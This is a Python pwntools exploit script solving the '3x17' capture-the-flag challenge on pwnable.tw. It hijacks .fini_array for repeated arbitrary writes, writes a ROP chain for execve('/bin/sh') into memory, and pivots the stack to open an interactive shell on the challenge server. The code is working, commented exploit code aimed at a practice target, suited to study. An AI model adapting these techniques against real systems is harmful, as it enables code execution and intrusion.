#!/usr/bin/env python3

from pwn import *

elf = ELF("./3x17")

context.binary = elf


def conn():
    if args.LOCAL:
        r = process([elf.path])
        # r = gdb.debug([elf.path])
        if args.DEBUG:
            gdb.attach(r)
    else: 
        r = remote("chall.pwnable.tw", 10105)

    return r

def arb_write(addr: int, data: bytes, r):
    r.sendlineafter(b'addr:', str(addr).encode())
    r.sendafter(b'data:', data)

def main():
    r = conn()

    # .init_array is of size 2*8 and .fini_array of size 2*8 is immediately after it
    init_array_addr = elf.get_section_by_name('.init_array').header.sh_addr # Not really needed
    fini_array_addr = elf.get_section_by_name('.fini_array').header.sh_addr
    
    # Gadget addresses
    libc_csu_fini_addr = 0x402960
    main_addr = 0x401b6d
    leave_ret_gadget = next(elf.search(asm('leave; ret')))
    ret_gadget = next(elf.search(asm('ret')))

    # First payload - Overwrite .fini_array with __libc_csu_fini and main to allow for continuous writes
    arb_write(fini_array_addr, p64(libc_csu_fini_addr) + p64(main_addr), r) # We want main() to run before __libc_csu_fini()

    # Construct ROP chain with the help of pwntools
    rop = ROP(elf)
    rop(rax=0x3b, rdi=0x4b7c70, rsi=0, rdx=0) # We will write b'/bin/sh\x00' into 0x4b7c70, which is just some arbitrary addr
    rop.raw(0x4022b4) # syscall gadget
    print(rop.dump())

    # Using multiple payloads, build up the ROP chain in the addresses above .fini_array
    rop_chain = rop.chain()
    for i in range(len(rop.chain())//16):
        arb_write(fini_array_addr + 16 + i*16, rop_chain[i*16:i*16+16], r)

    # Write b'/bin/sh\x00' into 0x4b7c70
    arb_write(0x4b7c70, b'/bin/sh\x00', r)

    # Last payload - Pivot the stack so that the ROP chain is executed
    arb_write(fini_array_addr, p64(leave_ret_gadget) + p64(ret_gadget), r)

    r.interactive()


if __name__ == "__main__":
    main()